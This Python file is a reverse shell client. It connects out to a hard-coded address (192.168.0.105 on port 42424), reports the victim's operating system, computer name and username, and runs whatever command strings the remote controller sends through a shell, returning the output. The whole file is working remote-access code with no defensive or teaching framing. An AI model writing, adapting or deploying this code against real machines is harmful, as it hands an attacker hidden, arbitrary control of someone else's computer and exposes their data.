import socket
import subprocess
import os
import platform
import getpass

# ------CONSTANTS-------
HEADERSIZE = 10

# timeout variable
timeout_count = 0


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try:
        s.connect(("192.168.0.105", 42424))
    except socket.error:
        if timeout_count == 10:  # if the connection attempt fails too many times. the program will quit
            print("Server not responding. Exiting the program")
            s.close()
            quit()
        timeout_count += 1
    else:
        break


while True:
    full_msg = ''
    new_msg = True
    while True:
        try:
            msg = s.recv(16)
        except ConnectionResetError:
            print("Connection was closed by the server")
        if new_msg:
            #print("new msg len:",msg[:HEADERSIZE])
            msglength = msg[:HEADERSIZE].decode("utf-8")
            #print("msg length {}".format(msglength.strip(" ")))
            try:
                msglen = int(msglength)
            except ValueError:
                continue
            new_msg = False

        #print(f"full message length: {msglen}")

        full_msg += msg.decode("utf-8")

        #print(len(full_msg))


        if len(full_msg)-HEADERSIZE == msglen:
            full_msg = full_msg[HEADERSIZE:]
            if "cd" in full_msg:
                #print("testt")
                try:
                    os.chdir(full_msg[3:])
                except:
                    pass
            if len(full_msg) > 0:
                if "getos" in full_msg:
                    output_bytes = bytes(str(platform.system() + "\n"), "utf-8")
                elif "info" in full_msg and platform.system() == "Windows":
                    sysinfo = f"""
                    Operating System: {platform.system()}
                    Computer Name: {platform.node()}
                    Username: {getpass.getuser()}
                    Release Version: {platform.release()}
                    Processor Architecture: {platform.processor()}
                                \n"""
                    output_bytes = bytes(str(sysinfo), "utf-8")
                elif "information" in full_msg and platform.system() != "Windows":
                    sysinfo = f"""
                                        Operating System: {platform.system()}
                                        Computer Name: {platform.node()}
                                        Username: {getpass.getuser()}
                                        Release Version: {platform.release()}
                                        Processor Architecture: {platform.processor()}
                                                    \n"""
                    output_bytes = bytes(str(sysinfo), "utf-8")
                else:
                    cmd = subprocess.Popen(full_msg[:], shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                output_str = output_str + str(os.getcwd()) + '> '
                output_str = f"{len(output_str):<{HEADERSIZE}}" + output_str
                s.send(str.encode(output_str, "utf-8"))
            full_msg = ""
            new_msg = True